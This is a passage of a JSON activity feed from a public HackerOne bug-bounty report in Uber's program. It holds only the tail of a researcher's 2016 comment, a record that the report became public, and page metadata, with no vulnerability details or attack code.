see.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-13T14:59:13.072Z","updated_at":"2016-05-13T14:59:13.072Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1000832,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-06T09:54:01.282Z","updated_at":"2016-06-06T09:54:01.282Z","actor":{"url":"/uber","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Uber"}},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}